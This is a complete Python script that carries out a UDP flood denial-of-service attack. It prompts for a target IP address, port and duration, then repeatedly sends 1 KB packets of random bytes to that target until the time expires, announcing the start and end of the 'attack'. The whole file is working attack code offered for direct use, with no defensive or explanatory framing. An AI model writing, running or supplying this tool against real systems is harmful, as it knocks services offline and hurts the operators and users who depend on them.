import socket
import random
import time  # Import the time module

def udp_flood(target_ip, target_port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    start_time = time.time()
    end_time = start_time + duration

    print(f"Starting UDP flood attack on {target_ip}:{target_port} for {duration} seconds...")

    while time.time() < end_time:
        # Generate random data
        data = random._urandom(1024)  # 1 KB of random data
        sock.sendto(data, (target_ip, target_port))

    print("Attack completed.")

if __name__ == "__main__":
    target_ip = input("Enter the target IP address: ")
    target_port = int(input("Enter the target port: "))
    duration = int(input("Enter the duration of the attack (in seconds): "))
    udp_flood(target_ip, target_port,duration)